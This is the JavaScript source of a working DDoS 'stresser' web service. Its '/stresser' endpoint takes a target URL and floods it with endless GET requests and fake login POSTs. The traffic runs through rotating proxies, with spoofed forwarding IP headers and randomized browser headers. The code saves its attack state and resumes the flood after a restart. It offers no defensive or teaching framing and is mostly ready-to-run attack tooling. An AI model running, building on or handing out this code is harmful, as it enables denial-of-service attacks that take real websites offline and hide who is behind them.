const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");
const { fakeState } = require("./fakeState.js");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, 'attackState.json');

const ensureStateFileExists = () => {
    if (!fs.existsSync(stateFilePath)) {
        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, requestsSent: 0, targetUrl: null }));
    }
};

const saveState = (state) => {
    fs.writeFileSync(stateFilePath, JSON.stringify(state));
};

const loadState = () => {
    ensureStateFileExists();
    try {
        const data = fs.readFileSync(stateFilePath, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error(`Failed to read state file: ${error}`);
        return { continueAttack: false, requestsSent: 0, targetUrl: null };
    }
};

const initialState = loadState();
let continueAttack = initialState.continueAttack;
let requestsSent = initialState.requestsSent;
let targetUrl = initialState.targetUrl;

const langHeaders = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en -gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-NZ,en;q=0.9",
    "en-ZA,en;q=0.9"
];

const referrers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords=",
    "https://net25.com/news"
];

const cipherSuites = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");
const maxRequests = Number.MAX_SAFE_INTEGER;
const requestsPerSecond = 10000000;
const numThreads = 100;

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
    try {
        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
};

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return [];
    }
};

const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
    if (!continueAttack) return;
    
    const headersForRequest = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Cache-Control": getRandomElement(cipherSuites),
        "Referer": getRandomElement(referrers),
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "TE": "Trailers",
        "Accept-Encoding": "gzip, deflate, br",
        "Pragma": getRandomElement(cipherSuites),
        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        "Host": url.replace(/https?:\/\//, "").split("/")[0],
        "sec-fetch-site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Origin": url.split("/").slice(0, 3).join("/"),
        "X-XSS-Protection": "1; mode=block",
        "X-Frame-Options": "DENY",
        "X-Content-Type-Options": "nosniff",
        "If-None-Match": '"W/"5c-1f7b"',
        "X-Requested-With": "XMLHttpRequest",
        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
        "Accept-Charset": "utf-8",
        "Expires": "0",
        "X-Content-Security-Policy": "default-src 'self';",
        "X-Download-Options": "noopen",
        "X-DNS-Prefetch-Control": "off",
        "X-Permitted-Cross-Domain-Policies": "none",
        "X-Powered-By": "PHP/7.4.3",
    };

    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
        state: fakeState()
    })
    .then((response) => {
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    })
    .catch((err) => {
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    });

    axios.get(url,
        {
            httpAgent: agent,
            headers: headersForRequest,
            timeout: 0,
        })
    .then((response) => {
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    })
    .catch((err) => {
        if (
            err.code === "ECONNRESET" ||
            err.code === "ECONNREFUSED" ||
            err.code === "EHOSTUNREACH" ||
            err.code === "ETIMEDOUT" ||
            err.code === "EAI_AGAIN" ||
            err.message === "Socket is closed"
        ) {
           // console.log(rainbow("Unable to Attack Target Server Refused!"));
        } else if (err.response?.status === 404) {
            console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
            continueAttack = false;
        } else if (err.response?.status === 503) {
            console.log(rainbow("Target under heavy load (503) - Game Over!"));
        } else if (err.response?.status === 502) {
            console.log(rainbow("Bad Gateway (502)."));
        } else if (err.response?.status === 403) {
          //  console.log(rainbow("Forbidden (403)."));
        } else if (err.response?.status) {
         //   console.log(rainbow(`DDOS Status: (${err.response?.status})`));
        } else {
          //  console.log(rainbow(err.message || "ATTACK FAILED!"));
        }
        requestsSent++;
        checkCompletion(requestsSent);
        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
    });
};

const updateState = () => {
    saveState({ continueAttack, requestsSent, targetUrl });
};

setInterval(updateState, 5000);

const startAttack = (url) => {
    if (!url || !/^https?:\/\//.test(url)) {
        console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
        return;
    }

    const proxies = loadProxies();
    if (!proxies.length) {
        console.error("No proxies found. Please add proxies to the proxy file.");
        return;
    }

    continueAttack = true;
    targetUrl = url;

    const attackTimeout = setTimeout(() => {
        continueAttack = false;
    }, (maxRequests / requestsPerSecond) * 1000);

    const checkCompletion = (sentRequests) => {
        if (sentRequests >= maxRequests) {
            clearTimeout(attackTimeout);
            continueAttack = false;
        }
    };

    for (let i = 0; i < numThreads; i++) {
        if (!continueAttack) break;

        const randomProxy = getRandomElement(proxies);
        const proxyParts = randomProxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);

        performAttack(url, agent, continueAttack, requestsSent, checkCompletion);
    }
};

app.get("/stresser", (req, res) => {
    const url = req.query.url;
    if (!url || !/^https?:\/\//.test(url)) {
        return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
    }
    targetUrl = url;
    startAttack(targetUrl);
    res.json({ message: "Starting DDOS ATTACK..." });
});

const port = process.env.PORT || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
app.listen(port, () => {
    console.log(rainbow(`API running on http://localhost:${port}`));
    if (continueAttack) {
        console.log(rainbow('Resuming previous attack...'));
        startAttack(targetUrl);
    }
});